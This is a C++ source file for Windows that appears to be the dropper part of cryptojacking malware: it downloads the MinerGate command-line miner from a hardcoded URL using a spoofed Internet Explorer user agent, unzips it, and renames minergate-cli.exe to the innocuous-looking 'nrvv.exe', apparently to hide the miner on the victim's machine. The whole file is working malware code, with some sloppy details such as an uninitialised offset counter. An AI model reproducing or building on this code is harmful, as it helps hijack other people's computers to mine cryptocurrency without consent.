#define _WIN32_WINNT 0x0500
#include "Utils.h"

struct Utils::DOWNLOAD_DATA
{
    char szUrl[1024];
    BOOL bFlag;
};

int Utils::DownloadMiner(DOWNLOAD_DATA data, char *szDataPath)
{
    HINTERNET hInetSession;

    HINTERNET hInetFile;

    HANDLE hFile;

    OVERLAPPED ovlp;

    DWORD dwOffset;
    DWORD dwRead;
    char szBuffer[4096];

	hInetSession = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.2914)",PRE_CONFIG_INTERNET_ACCESS, NULL, NULL, 0);

    if(hInetSession == NULL)
                return -1;

    hInetFile = InternetOpenUrl(hInetSession, data.szUrl, NULL, 0, 0, NULL);

    if(hInetFile == NULL)
        return -1;

    hFile = CreateFile(szDataPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hFile == INVALID_HANDLE_VALUE)
    {
		InternetCloseHandle(hInetSession);
        InternetCloseHandle(hInetFile);
        return -1;
    }

    if(data.bFlag)
        InternetSetFilePointer(hInetFile, GetFileSize(hFile, NULL), NULL, FILE_BEGIN, 0);

    do
    {
        InternetReadFile(hInetFile, szBuffer, 4096, &dwRead);
        if(dwRead >= 0)
        {
            ovlp.hEvent = NULL;
            ovlp.OffsetHigh = NULL;
            ovlp.Offset = GetFileSize(hFile, NULL);

            WriteFile(hFile, szBuffer, dwRead, NULL, &ovlp);
            dwOffset += dwRead;
        }

        else
        {
            InternetCloseHandle(hInetSession);
            InternetCloseHandle(hInetFile);

            hInetSession = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.2914)", PRE_CONFIG_INTERNET_ACCESS, NULL, NULL, 0);

			if(hInetSession == NULL)
            {
                CloseHandle(hFile);
                return -1;
            }

            hInetFile = InternetOpenUrl(hInetSession, data.szUrl, NULL, 0, 0, NULL);

            if(hInetFile == NULL)
            {
				CloseHandle(hFile);
                InternetCloseHandle(hInetSession);
                return -1;
            }

            InternetSetFilePointer(hInetFile, dwOffset, NULL, FILE_BEGIN, NULL);
        }
    }
	while(dwRead);

    CloseHandle(hFile);
    InternetCloseHandle(hInetSession);
    InternetCloseHandle(hInetFile);

    return 0;
}

void Utils::DropMiner(char *szDataPath)
{
    DOWNLOAD_DATA data;

    strcpy(data.szUrl, "https://minergate.com/download/win32-cli");
    data.bFlag = false;

	DownloadMiner(data, szDataPath);
}

int Utils::unpack(char *szDataPath, char *szMinerPathP)
{
	HZIP hZip = OpenZip((const TCHAR *)szDataPath, 0);

	if(hZip == NULL)
        return 1;

    SetUnzipBaseDir(hZip, szMinerPathP);

	ZIPENTRY sZE;

	GetZipItem(hZip, -1, &sZE);

	int cItems = sZE.index;
	for (int i = 0; i < cItems; i++)
	{
		GetZipItem(hZip, i, &sZE);

        char *ZEName = sZE.name;

		char *ePointer = strstr(ZEName, "/");

        if(ePointer)
        {
            memmove(ZEName, ePointer, strlen(ePointer)+1);
        }

        string s = ZEName;
        s.erase(0,1);

		UnzipItem(hZip, i, (TCHAR *)s.c_str());
	}
	CloseZip(hZip);

    char szNewFilePath[256];
	strncpy(szNewFilePath, szMinerPathP, 256);
	strcat(szNewFilePath, "\\nrvv.exe");

	strcat(szMinerPathP, "\\minergate-cli.exe");

	MoveFile(szMinerPathP, szNewFilePath);
	return 0;
}


